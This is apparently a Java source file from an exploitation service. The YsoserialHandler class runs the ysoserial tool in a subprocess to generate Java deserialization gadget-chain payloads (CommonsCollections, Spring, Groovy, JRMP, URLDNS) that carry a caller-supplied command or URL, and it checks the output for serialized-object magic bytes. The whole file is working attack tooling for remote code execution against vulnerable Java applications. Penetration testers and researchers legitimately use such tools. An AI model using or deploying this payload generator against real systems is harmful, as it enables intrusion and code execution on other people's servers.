package com.oobx.chains;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.logging.Logger;

/**
 * Invokes ysoserial via a subprocess to isolate its System.exit() calls
 * and class conflicts from the Spring Boot JVM.
 *
 * Uses a dedicated Java binary (ideally Java 8) for full compatibility
 * with all chains (Groovy1 etc. fail on Java 9+ due to MethodHandles changes).
 *
 * Configure via: ysoserial.java=/path/to/java8
 */
@Component
public class YsoserialHandler implements ChainHandler {

    private static final Logger log = Logger.getLogger(YsoserialHandler.class.getName());

    @Value("${ysoserial.java:}")
    private String configuredJava;

    public static final List<String> SUPPORTED_CHAINS = List.of(
            "CommonsCollections1","CommonsCollections2","CommonsCollections3",
            "CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7",
            "CommonsBeanutils1","Spring1","Spring2","Hibernate1",
            "ROME","Groovy1","Jdk7u21","URLDNS","JRMPClient","JRMPListener"
    );

    private static final Map<String, String> ID_TO_CHAIN = Map.ofEntries(
            Map.entry("ysoserial_cc1",         "CommonsCollections1"),
            Map.entry("ysoserial_cc2",         "CommonsCollections2"),
            Map.entry("ysoserial_cc3",         "CommonsCollections3"),
            Map.entry("ysoserial_cc4",         "CommonsCollections4"),
            Map.entry("ysoserial_cc5",         "CommonsCollections5"),
            Map.entry("ysoserial_cc6",         "CommonsCollections6"),
            Map.entry("ysoserial_cc7",         "CommonsCollections7"),
            Map.entry("ysoserial_cb1",         "CommonsBeanutils1"),
            Map.entry("cb_no_cc",              "CommonsBeanutils1"),
            Map.entry("ysoserial_spring1",     "Spring1"),
            Map.entry("ysoserial_spring2",     "Spring2"),
            Map.entry("ysoserial_hibernate1",  "Hibernate1"),
            Map.entry("ysoserial_rome",        "ROME"),
            Map.entry("ysoserial_groovy1",     "Groovy1"),
            Map.entry("ysoserial_jdk7u21",     "Jdk7u21"),
            Map.entry("ysoserial_urldns",      "URLDNS"),
            Map.entry("ysoserial_jrmp_client", "JRMPClient"),
            Map.entry("ysoserial_jrmplistener","JRMPListener")
    );

    @Override
    public PayloadResult generate(String chainId, Map<String, Object> params) throws Exception {
        String chain = ID_TO_CHAIN.getOrDefault(chainId, chainId);
        String cmd = (String) params.getOrDefault("cmd", "");
        String url = (String) params.getOrDefault("url", cmd);
        String arg = chain.equals("URLDNS") ? (url.isEmpty() ? cmd : url) : (cmd.isEmpty() ? url : cmd);

        byte[] bytes = invokeYsoserial(chain, arg, resolveJavaExe());
        if (bytes.length == 0) {
            return new PayloadResult("application/octet-stream", bytes,
                    Map.of("error", "ysoserial returned empty",
                           "chain", chain, "arg", arg,
                           "hint", "Ensure ysoserial-all.jar is in libs/"));
        }
        return new PayloadResult("application/octet-stream", bytes,
                Map.of("chain", chain, "arg", arg, "size", bytes.length));
    }

    private String resolveJavaExe() {
        // 1. Explicitly configured path
        if (configuredJava != null && !configuredJava.isBlank()) {
            return configuredJava;
        }
        // 2. Auto-detect Java 8 on common paths
        String[] candidates = {
            "C:\\Program Files\\Java\\jdk1.8.0_202\\bin\\java.exe",
            "C:\\Program Files\\Java\\jdk1.8.0_65\\bin\\java.exe",
            "C:\\Program Files (x86)\\Java\\jdk1.8.0_71\\bin\\java.exe",
            "/usr/lib/jvm/java-8-openjdk-amd64/bin/java",
            "/usr/lib/jvm/java-8-openjdk/bin/java",
            "/usr/local/opt/openjdk@8/bin/java",
        };
        for (String path : candidates) {
            if (new java.io.File(path).exists()) {
                log.info("Using Java 8 for ysoserial: " + path);
                return path;
            }
        }
        // 3. Fallback to current JVM (may fail for some chains on Java 9+)
        return ProcessHandle.current().info().command().orElse("java");
    }

    /**
     * Run ysoserial as a subprocess with the specified Java binary.
     * Java 8 is recommended for full chain compatibility (Groovy1, etc.).
     */
    public static byte[] invokeYsoserial(String chain, String arg, String javaExe) {
        File ysoJar = findJar("ysoserial");
        if (ysoJar == null) {
            log.warning("ysoserial jar not found in libs/");
            return new byte[0];
        }

        // Build command — Java 8 doesn't need --add-opens
        List<String> cmd = new ArrayList<>();
        cmd.add(javaExe);

        // Only add --add-opens for Java 9+ (detected by version string)
        if (!isJava8(javaExe)) {
            cmd.addAll(List.of(
                "--add-opens", "java.base/java.util=ALL-UNNAMED",
                "--add-opens", "java.base/java.lang=ALL-UNNAMED",
                "--add-opens", "java.base/java.lang.reflect=ALL-UNNAMED",
                "--add-opens", "java.base/java.lang.invoke=ALL-UNNAMED",
                "--add-opens", "java.base/java.io=ALL-UNNAMED",
                "--add-opens", "java.base/java.net=ALL-UNNAMED",
                "--add-opens", "java.base/sun.reflect.annotation=ALL-UNNAMED",
                "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
                "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
                "--add-opens", "java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED",
                "--add-opens", "java.xml/com.sun.org.apache.xml.internal.utils=ALL-UNNAMED",
                "--add-opens", "java.rmi/sun.rmi.server=ALL-UNNAMED",
                "--add-opens", "java.rmi/sun.rmi.registry=ALL-UNNAMED"
            ));
        }

        cmd.addAll(List.of("-jar", ysoJar.getAbsolutePath(), chain, arg));

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(false);
        try {
            Process proc = pb.start();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            try (InputStream is = proc.getInputStream()) {
                int n;
                while ((n = is.read(buf)) != -1) bos.write(buf, 0, n);
            }
            proc.waitFor();
            byte[] out = bos.toByteArray();
            if (out.length >= 2 && out[0] == (byte) 0xAC && out[1] == (byte) 0xED) {
                return out;
            }
            log.warning("ysoserial chain=" + chain + " output doesn't start with 0xACED (len=" + out.length + ")");
            return new byte[0];
        } catch (Exception e) {
            log.warning("ysoserial subprocess error for chain=" + chain + ": " + e);
            return new byte[0];
        }
    }

    private static boolean isJava8(String javaExe) {
        try {
            Process p = new ProcessBuilder(javaExe, "-version").redirectErrorStream(true).start();
            String out = new String(p.getInputStream().readAllBytes());
            p.waitFor();
            return out.contains("\"1.8") || out.contains("\"1.7") || out.contains("\"1.6");
        } catch (Exception e) {
            return false;
        }
    }

    // Backwards-compatible static overload (used by tests / RebindStore)
    public static byte[] invokeYsoserial(String chain, String arg) {
        String java8 = detectJava8();
        return invokeYsoserial(chain, arg, java8);
    }

    private static String detectJava8() {
        String[] candidates = {
            "C:\\Program Files\\Java\\jdk1.8.0_202\\bin\\java.exe",
            "C:\\Program Files\\Java\\jdk1.8.0_65\\bin\\java.exe",
            "C:\\Program Files (x86)\\Java\\jdk1.8.0_71\\bin\\java.exe",
            "/usr/lib/jvm/java-8-openjdk-amd64/bin/java",
            "/usr/lib/jvm/java-8-openjdk/bin/java",
        };
        for (String path : candidates) {
            if (new java.io.File(path).exists()) return path;
        }
        return ProcessHandle.current().info().command().orElse("java");
    }

    public static File findJar(String namePart) {
        for (String rel : new String[]{"libs", "../libs", "bytecode-service/libs"}) {
            File dir = new File(rel);
            if (!dir.isDirectory()) continue;
            File[] files = dir.listFiles(f ->
                    f.getName().endsWith(".jar") &&
                    f.getName().toLowerCase().contains(namePart.toLowerCase()));
            if (files != null && files.length > 0) return files[0];
        }
        return null;
    }
}
